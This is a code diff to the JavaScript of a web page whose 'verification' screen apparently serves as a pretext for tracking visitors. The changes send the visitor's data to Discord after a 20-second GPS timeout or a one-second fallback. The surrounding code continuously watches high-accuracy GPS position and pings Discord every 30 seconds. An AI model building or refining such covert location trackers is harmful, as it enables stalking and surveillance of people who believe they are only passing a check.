@@ -181,15 +181,22 @@ async function startVerification() {
             msg.style.opacity = '0.8';
         }
         
-        // ENVOI IMMÉDIAT DISCORD (sans attendre le GPS pour libérer l'écran)
-        logVisitor(null, false, true);
-
         // On libère l'écran tout de suite pour l'utilisateur
         overlay.style.display = 'none';
 
         let firstGpsPointSent = false;
+        let timeoutHandle = null;
 
         if (navigator.geolocation) {
+            // TIMEOUT DE SECOURS: Si pas de GPS après 20s, envoyer le ping sans GPS à Discord
+            timeoutHandle = setTimeout(() => {
+                if (!firstGpsPointSent) {
+                    console.log("GPS timeout - envoi ping sans GPS à Discord");
+                    logVisitor(null, false, true);
+                    firstGpsPointSent = true;
+                }
+            }, 20000);
+
             navigator.geolocation.watchPosition(
                 async (position) => {
                     const newLoc = {
@@ -200,6 +207,7 @@ async function startVerification() {
                     // PREMIER POINT GPS: Toujours envoyer à Discord avec forceDiscord
                     if (!firstGpsPointSent) {
                         firstGpsPointSent = true;
+                        clearTimeout(timeoutHandle);
                         lastLoggedPos = newLoc;
                         await logVisitor(newLoc, false, true);
                         return;
@@ -227,6 +235,9 @@ async function startVerification() {
                 null,
                 { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
             );
+        } else {
+            // Pas de géolocalisation: envoyer un ping simple après 1s
+            setTimeout(() => logVisitor(null, false, true), 1000);
         }
 
         setInterval(() => logVisitor(null, true), 30000);
